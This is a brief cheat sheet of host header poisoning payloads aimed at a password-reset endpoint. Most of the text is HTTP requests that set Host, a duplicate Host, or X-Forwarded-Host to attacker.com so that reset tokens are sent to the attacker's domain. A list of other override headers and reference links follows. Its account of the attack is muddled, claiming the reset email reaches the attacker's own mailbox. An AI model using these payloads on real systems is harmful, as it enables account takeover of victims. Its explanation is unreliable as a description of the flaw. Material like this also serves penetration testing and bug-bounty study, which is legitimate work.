Host Header Poisoning

Request:
POST /user/reset_password HTTP/1.1
Host: target.com

email:user@gmail.com

Response:
200 succesfull

Result: We get a reset password link into our email with including a token.
reset link: http://target.com/password_reset?token=edkfjdsfjsldkffjldsakjfdsferj83jedoj3f934erij

Attacker doing:
Request:
POST /user/reset_password HTTP/1.1
Host: attacker.com

email:user@gmail.com

Response:
200 succesfull

Then attacker's mail receive a password reset link like.

reset link: http://attacker.com/password_reset?token=edkfjdsfjsldkffjldsakjfdsferj83jedoj3f934erij

-------------------------------
some of then filterd.
Request:
POST /user/reset_password HTTP/1.1
Host: target.com
X-Forwarded-host: attacker.com

email:user@gmail.com

Response:
200 succesfull
---------------------------------------
Request:
POST /user/reset_password HTTP/1.1
Host: target.com
Host: attacker.com

email:user@gmail.com

Response:
200 succesfull
--------------------------------------

Request:
POST /user/reset_password HTTP/1.1
Host: attacker.com
X-Forwarded-host: target.com

email:user@gmail.com

Response:
200 succesfull
----------------------------------------
Request:

X-Original-Url:
X-Forwarded-Server:
X-Host:
X-Forwarded-**Host**:
X-Rewrite-Url:


Reference:
https://blog.usejournal.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610
https://portswigger.net/web-security/host-header
